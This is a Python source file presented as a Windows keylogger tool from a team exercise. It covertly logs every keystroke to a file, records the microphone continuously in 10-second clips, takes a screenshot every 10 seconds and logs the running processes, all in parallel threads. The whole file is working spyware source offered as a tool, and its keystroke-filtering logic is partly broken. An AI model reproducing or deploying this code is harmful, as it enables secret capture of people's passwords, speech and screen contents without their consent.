# Author: Mustafa Atif Ibrahim
# Email: mxi6027@rit.edu
# Tool: Windows_Keylogger
# Team: Bravo


from pynput.keyboard import Listener, Key
import sounddevice as sd
from scipy.io.wavfile import write
import numpy as np
import logging
import cv2
import pyautogui
import time
import threading
import wmi


# A string variable 'key_data'
key_data = ""


# Function to record the keyboard keystrokes
def keyboard_log(key):
    global key_data
    # Basic Config for the logging
    logging.basicConfig(filename="keyboard.log", filemode="a", level=logging.DEBUG, format='%(asctime)s %(message)s')
    # All if statements will replace the 'key_data' variable with a space except when
    # The user hits the enter key, in which case, it goes to the new line.
    if key_data == "Key.space":
        key_data = ' '
    if key_data == "Key.enter":
        key_data = '\n'
    if key_data == "Key.tab":
        key_data = ' '
    if key_data == "Key.ctrl_l":
        key_data = ' '
    if key_data == "Key.backspace":
        key_data = ' '
    # Else removes quotations in the 'key_data' variable
    else:
        logging.info(key_data.replace("'", ""))
        key_data += str(key)


# Function to listen to the keyboard strokes.
def ListenKeyboard():
    global key_data
    # A with loop that listens to the keyboard strokes made and calls the 'keyboard_log' function.
    with Listener(on_press=keyboard_log) as listen:
        listen.join()


# Function that listens and records the microphone waves.
def Microphone():
    # A try block that executes the following commands.
    try:
        # Integer variable 'file' set to 0.
        file = 0
        # While loop executed as long as it is true.
        while True:
            # Integer variable 'fs' (frame per second) set to 44100.
            fs = 44100
            # Integer variable 'second' set to 10.
            second = 10
            print("Recording.....")
            # To record audio data from your sound device into a NumPy array.
            record = sd.rec(int(second * fs), samplerate=fs, channels=2)
            sd.wait()
            # Writes the audio data recorded to the .wav extension file.
            write('output.%01d.wav' % file, fs, record)
            # Increments the file count by 1.
            file = file + 1
            # Time delayed by 10 seconds.
            time.sleep(10)
        # Except block that terminates the function.
    except KeyboardInterrupt:
        print("Press Ctrl-C to terminate while statement")
    pass


# Function that takes screen shots of the system
def screenshot():
    # Try block that executes the following commands.
    try:
        # An integer variable 'capture' set to 0.
        capture = 0
        # A while loop executed when true.
        while True:
            # A GUI that takes the screenshot and stores the variable in 'screen'.
            screen = pyautogui.screenshot()
            # Continuously grab frames of all or a portion of the screen
            screen = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)
            # Write to screenshot file
            cv2.imwrite('screenshot.%01d.png' % capture, screen)
            capture = capture + 1
            time.sleep(10)
    # Except block that terminates the function.
    except KeyboardInterrupt:
        print("Press Ctrl-C to terminate while statement")
    pass


# Function that prints the process ID and name.
def running_process():
    # A library that finds active processes and stores in the 'constructor' variable.
    constructor = wmi.WMI()
    print(" Pid  Process Name")
    # A for loop that gets the active processes from Task Manager.
    for process in constructor.Win32_process():
        # A with loop that appends the actives processes from Task Manager into the
        # File 'ps.log'
        with open("ps.log", "a") as ps:
            ps.write(f"\n{process.ProcessID} {process.name}")


# The main method that calls all the functions listed above simultaneously using threads.
def main():
    threading.Thread(target=ListenKeyboard).start()
    threading.Thread(target=screenshot).start()
    threading.Thread(target=Microphone).start()
    threading.Thread(target=running_process).start()



if __name__ == '__main__':
    main()
